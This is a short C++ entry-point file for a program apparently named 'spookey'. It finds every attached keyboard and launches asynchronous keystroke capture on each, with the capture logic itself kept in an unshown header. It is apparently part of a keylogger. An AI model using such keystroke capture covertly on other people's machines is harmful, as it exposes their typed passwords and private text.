#include <future>
#include <string>
#include <vector>

#include "spookey.hh"

int main(int argc, char** argv) {
    // Parse command-line arguments
    for (int i = 0; i < argc; i++) {
        if (strcmp(argv[i], "--debug") == 0) DEBUG = true;
    }

    // Find keyboards
    std::vector<Keyboard> keyboards = findKeyboards();
    int numKeyboards = keyboards.size();

    /* Begin capturing keystrokes asynchronously. Futures need to be stored,
     * otherwise function will not run asynchronously */
    std::vector<std::future<void>> asyncFutures;
    for (int i = 0; i < numKeyboards; ++i) {
        asyncFutures.push_back(
            std::async(std::launch::async, &Keyboard::capture, &keyboards[i]));
    }

    return 0;
}
